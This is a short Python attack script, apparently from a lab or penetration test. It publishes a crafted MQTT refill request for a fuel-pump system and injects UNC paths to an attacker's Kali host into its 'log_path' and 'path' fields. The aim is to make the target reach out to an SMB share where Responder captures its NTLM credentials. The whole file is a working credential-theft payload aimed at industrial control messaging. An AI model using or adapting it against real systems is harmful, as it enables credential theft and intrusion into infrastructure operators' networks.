import json
import paho.mqtt.client as mqtt

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Mantém as variáveis originais intactas e adiciona gatilhos extras no JSON
payload = {
    "pumpId": "PUMP003",
    "currentLevel": 5,
    "log_path": rf"\\{KALI_IP}\share",
    "path": rf"\\{KALI_IP}\share"
}

client.publish("fuel-pumps/refill-request", json.dumps(payload))
print("[+] Teste 2 enviado. Monitore o Responder!")
client.disconnect()
